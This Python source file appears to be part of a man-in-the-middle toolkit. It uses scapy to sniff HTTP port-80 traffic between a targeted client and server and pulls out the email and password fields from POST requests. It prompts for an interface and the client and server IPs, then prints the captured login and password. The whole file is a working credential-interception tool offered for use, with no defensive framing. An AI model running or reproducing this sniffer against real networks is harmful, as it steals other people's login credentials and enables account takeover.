from pip._vendor.distlib.compat import raw_input
from scapy.all import *

from src.mitm.utils import get_mac

login = ""
password = ""
login_field = "email="
password_field = "passwd="


def get_index(buff, subbuff):
    return buff.index(subbuff)


def get_http_credentials(pkt):
    global login
    global password
    global password_field
    global login_field
    full_str_credentials = ""

    try:
        pkt.getlayer(Raw).load

    except Exception as e:
        return

    payload = str(pkt.getlayer(Raw).load)
    if "POST" in payload and "Upgrade-Insecure-Requests" in payload:
        try:
            for i in range(get_index(payload, login_field), len(payload) - 1):
                full_str_credentials = full_str_credentials + payload[i]

        except Exception as e:
            print("an error occured: " + str(e))
            print("credentials not found in POST request")
            return

        for j in range(get_index(full_str_credentials, login_field) + len(login_field),
                       full_str_credentials.index("&")):
            login = login + full_str_credentials[j]

        for k in range(get_index(full_str_credentials, password_field) + len(password_field),
                       len(full_str_credentials)):
            password = password + full_str_credentials[k]

        print("user login: " + login + " | user password: " + password)
        sys.exit(1)

    else:
        return


def run():
    try:
        interface = raw_input("Enter Desired Interface [eth0]: ")
        if interface == "":
            interface = "eth0"
        target1_ip = raw_input("[*] Enter Client IP: ")
        target2_ip = raw_input("[*] Enter Server IP: ")

    except KeyboardInterrupt:
        print("\n[*] User Requested Shutdown")
        print("[*] Exiting...")
        sys.exit(1)

    client_mac = get_mac(target1_ip)
    sniff(iface=interface, prn=get_http_credentials,
          filter='dst port 80 and ether src {} and host {}'.format(client_mac, target2_ip), store=0, count=0)
